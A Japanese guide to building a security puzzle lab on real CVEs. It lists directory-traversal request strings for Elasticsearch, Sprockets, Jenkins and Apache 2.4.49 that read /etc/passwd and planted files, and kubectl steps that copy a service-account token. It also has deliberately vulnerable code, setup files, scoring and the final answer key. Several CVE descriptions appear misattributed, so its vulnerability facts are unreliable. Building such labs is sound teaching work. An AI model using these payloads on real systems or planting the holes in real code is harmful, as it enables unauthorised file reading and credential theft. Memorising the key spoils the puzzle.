# 実在のライブラリ脆弱性を利用した謎解き

## 概要
このファイルは、実際に存在したライブラリの脆弱性（CVE）を利用した謎解きクイズの実装ガイドです。すべての脆弱性は**ファイル・データの閲覧**に限定されており、任意コード実行は含みません。これにより、挑戦者のセキュリティ知識と調査能力を安全に測定できます。

## 脆弱性リスト

### 1. CVE-2015-5531 - Elasticsearch < 1.6.1
**概要**: サイトプラグイン経由でのディレクトリトラバーサル脆弱性

```bash
# 脆弱なバージョンでの再現
GET /_plugin/head/../../../../../etc/passwd

# 謎解き実装
GET /_plugin/puzzle/../../../../../var/secrets/protocol_seven.key
```

**設置方法**:
```yaml
# docker-compose.yml
elasticsearch:
  image: elasticsearch:1.5.2
  ports:
    - "9200:9200"
  volumes:
    - ./secrets:/var/secrets:ro
  environment:
    - "discovery.type=single-node"
```

### 2. CVE-2021-29425 - Apache Commons IO < 2.7
**概要**: FileNameUtils.normalize()のダブルスラッシュ処理の脆弱性

```java
// 脆弱なコード例
@RestController
public class FileController {
    @GetMapping("/download")
    public ResponseEntity<Resource> downloadFile(@RequestParam String filename) {
        // Commons IO 2.6を使用
        String normalizedPath = FilenameUtils.normalize(uploadDir + "/" + filename);
        // /public/uploads//..//..//secrets/hint.txt で秘密ファイルにアクセス可能
        
        Path filePath = Paths.get(normalizedPath);
        Resource resource = new FileSystemResource(filePath);
        
        return ResponseEntity.ok()
            .header("Content-Disposition", "attachment; filename=\"" + resource.getFilename() + "\"")
            .body(resource);
    }
}
```

**pom.xml**:
```xml
<dependency>
    <groupId>commons-io</groupId>
    <artifactId>commons-io</artifactId>
    <version>2.6</version> <!-- 脆弱なバージョン -->
</dependency>
```

### 3. CVE-2018-3760 - Ruby on Rails (Sprockets)
**概要**: アセットパイプラインでのパストラバーサル脆弱性

```ruby
# Gemfile
gem 'rails', '5.1.6' # 脆弱なバージョン
gem 'sprockets', '< 3.7.2'

# 攻撃パターン
# /assets/file:%2f%2f/etc/passwd でシステムファイル読み取り
# /assets/file:%2f%2f/app/secrets/protocol_seven.rb で謎解きファイル
```

**設置方法**:
```dockerfile
FROM ruby:2.5
RUN gem install rails -v 5.1.6
COPY ./puzzle_app /app
WORKDIR /app
RUN bundle install
CMD ["rails", "server", "-b", "0.0.0.0"]
```

### 4. CVE-2014-0050 - Apache Commons FileUpload < 1.3.1
**概要**: multipart/form-dataの境界文字列処理でのメモリ漏洩

```java
@RestController
public class UploadController {
    @PostMapping("/upload")
    public String handleFileUpload(HttpServletRequest request) {
        // Commons FileUpload 1.3.0を使用
        DiskFileItemFactory factory = new DiskFileItemFactory();
        ServletFileUpload upload = new ServletFileUpload(factory);
        
        // メモリに事前に秘密情報を配置
        String secret = "Protocol_Seven_Key: a7b3c9d";
        
        try {
            List<FileItem> items = upload.parseRequest(request);
            // 巨大なContent-Typeヘッダーでメモリ漏洩を引き起こす
        } catch (Exception e) {
            // エラー時にメモリ内容が露出する可能性
            return e.getMessage(); // 謎解き用に意図的に露出
        }
        
        return "Upload complete";
    }
}
```

### 5. CVE-2019-11248 - Kubernetes kubectl cp
**概要**: tarアーカイブ内のシンボリックリンクを利用したファイル窃取

```bash
# Pod内での準備（攻撃者側）
kubectl exec -it vulnerable-pod -- bash
ln -s /var/run/secrets/kubernetes.io/serviceaccount/token /tmp/escape
ln -s /secrets/protocol_seven.txt /tmp/hint

# kubectl cp での窃取（脆弱なバージョン）
kubectl cp vulnerable-pod:/tmp/escape ./stolen_token
kubectl cp vulnerable-pod:/tmp/hint ./stolen_hint
```

**設置方法**:
```yaml
# deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vulnerable-kubectl
spec:
  replicas: 1
  template:
    spec:
      containers:
      - name: puzzle
        image: bitnami/kubectl:1.12.8  # 脆弱なバージョン
        volumeMounts:
        - name: secrets
          mountPath: /secrets
      volumes:
      - name: secrets
        secret:
          secretName: puzzle-secrets
```

### 6. CVE-2018-1000861 - Jenkins Stapler Framework
**概要**: 動的ルーティングでの任意ファイル読み取り

```groovy
// 脆弱なJenkinsバージョン: <= 2.153
// 攻撃URL
GET /securityRealm/user/admin/descriptorByName/../../../../../../../../etc/passwd

// 謎解き用URL
GET /securityRealm/user/admin/descriptorByName/../../../../secrets/hint.xml
```

**docker-compose.yml**:
```yaml
jenkins:
  image: jenkins/jenkins:2.138.3  # 脆弱なバージョン
  ports:
    - "8080:8080"
  volumes:
    - ./secrets:/secrets:ro
  environment:
    - JENKINS_OPTS=--httpPort=8080
```

### 7. CVE-2021-41773 - Apache HTTP Server
**概要**: URLエンコーディングの二重処理によるパストラバーサル

```apache
# Apache 2.4.49の設定
<Directory />
    Require all denied
</Directory>

<Directory "/var/www/html">
    Require all granted
</Directory>

# CGI有効化（脆弱性発動に必要）
LoadModule cgid_module modules/mod_cgid.so
```

**攻撃パターン**:
```bash
# 通常のアクセス（ブロックされる）
curl http://puzzle.aegis.com/cgi-bin/../etc/passwd

# 脆弱性を利用（%2eをさらにエンコード）
curl http://puzzle.aegis.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd

# 謎解き用
curl http://puzzle.aegis.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/opt/secrets/protocol_seven.txt
```

### 8. CVE-2021-21315 - Node.js systeminformation
**概要**: services()関数での情報漏洩（コマンドインジェクションを情報取得に限定）

```javascript
// vulnerable-server.js
const express = require('express');
const si = require('systeminformation'); // version 4.34.22

const app = express();

// 秘密情報を環境変数に設定
process.env.PROTOCOL_SEVEN_HINT = 'Check_commit_a7b3c9d';

app.get('/services/:name', async (req, res) => {
    try {
        // 脆弱なバージョンでは特殊な入力で環境変数が露出
        const data = await si.services(req.params.name);
        res.json(data);
    } catch (error) {
        // エラーメッセージに情報が含まれる可能性
        res.json({ error: error.message });
    }
});

app.listen(3000);
```

## 実装ガイドライン

### セキュリティ対策
1. **隔離環境**: すべての脆弱なサービスはDockerコンテナ内で実行
2. **ネットワーク分離**: 各サービスは独立したネットワークで動作
3. **読み取り専用**: 秘密ファイルは読み取り専用でマウント
4. **リソース制限**: CPU/メモリ使用量を制限

### docker-compose.yml（全体構成）
```yaml
version: '3.8'

services:
  elasticsearch-puzzle:
    image: elasticsearch:1.5.2
    container_name: puzzle_es
    ports:
      - "9201:9200"
    volumes:
      - ./secrets/es:/var/secrets:ro
    networks:
      - puzzle-net
    mem_limit: 512m
    cpus: 0.5

  rails-puzzle:
    build: ./rails-app
    container_name: puzzle_rails
    ports:
      - "3001:3000"
    volumes:
      - ./secrets/rails:/app/secrets:ro
    networks:
      - puzzle-net
    mem_limit: 512m

  jenkins-puzzle:
    image: jenkins/jenkins:2.138.3
    container_name: puzzle_jenkins
    ports:
      - "8081:8080"
    volumes:
      - ./secrets/jenkins:/secrets:ro
    networks:
      - puzzle-net
    mem_limit: 1g

  apache-puzzle:
    image: httpd:2.4.49
    container_name: puzzle_apache
    ports:
      - "8082:80"
    volumes:
      - ./secrets/apache:/opt/secrets:ro
      - ./apache-config:/usr/local/apache2/conf:ro
    networks:
      - puzzle-net
    mem_limit: 256m

networks:
  puzzle-net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/16
```

### 秘密ファイルの配置
```bash
# ディレクトリ構造
secrets/
├── es/
│   └── protocol_seven.key          # "ELASTICSEARCH_KEY_PART: a7b3"
├── rails/
│   └── protocol_seven.rb           # "RAILS_KEY_PART: c9d1"
├── jenkins/
│   └── hint.xml                    # "JENKINS_KEY_PART: e5f7"
└── apache/
    └── protocol_seven.txt          # "FINAL_KEY: a7b3c9d1e5f7"
```

## プレイヤー向けヒント

### ステージ1: 偵察
```bash
# サービスのバージョン確認
curl -X GET "http://puzzle.aegis.com:9201"
curl -X GET "http://puzzle.aegis.com:8081/login"
curl -I "http://puzzle.aegis.com:8082"

# CVEデータベースで脆弱性を検索
# 例: "Elasticsearch 1.5.2 file disclosure CVE"
```

### ステージ2: 脆弱性の特定
```bash
# 各サービスの既知の脆弱性をテスト
# Elasticsearch
curl "http://puzzle.aegis.com:9201/_plugin/head/../../../../../var/secrets/protocol_seven.key"

# Apache
curl "http://puzzle.aegis.com:8082/cgi-bin/.%2e/.%2e/.%2e/.%2e/opt/secrets/protocol_seven.txt"

# Jenkins
curl "http://puzzle.aegis.com:8081/securityRealm/user/admin/descriptorByName/../../../../secrets/hint.xml"
```

### ステージ3: パズルの解決
```python
# 収集したキーの断片を結合
keys = [
    "ELASTICSEARCH_KEY_PART: a7b3",
    "RAILS_KEY_PART: c9d1",
    "JENKINS_KEY_PART: e5f7"
]

final_key = "".join([k.split(": ")[1] for k in keys])
print(f"Protocol Seven Activation Key: {final_key}")
# Output: Protocol Seven Activation Key: a7b3c9d1e5f7
```

## 採点基準

1. **脆弱性の発見** (各10点)
   - 各サービスのバージョン特定
   - 対応するCVEの特定

2. **エクスプロイトの実行** (各20点)
   - 正しいペイロードの構築
   - ファイル内容の取得

3. **パズルの完成** (20点)
   - すべてのキー断片の収集
   - 最終キーの組み立て

**合計**: 100点

## 注意事項

1. この謎解きは**教育目的**のみで使用してください
2. 実際のシステムに対して同様の攻撃を行うことは違法です
3. すべての脆弱性は既にパッチが提供されています
4. 最新バージョンのライブラリを使用することの重要性を学んでください